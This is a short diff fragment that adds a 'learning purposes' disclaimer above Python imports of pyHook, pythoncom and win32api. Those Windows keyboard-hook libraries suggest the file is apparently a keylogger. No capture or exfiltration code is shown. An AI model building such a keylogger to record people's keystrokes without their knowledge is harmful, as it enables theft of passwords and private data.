@@ -1,3 +1,6 @@
+#Built for learning purposes
+#Please don't use it for bad 
+
 import pyHook, pythoncom, sys, logging, win32api
 from pyHook import HookManager
 
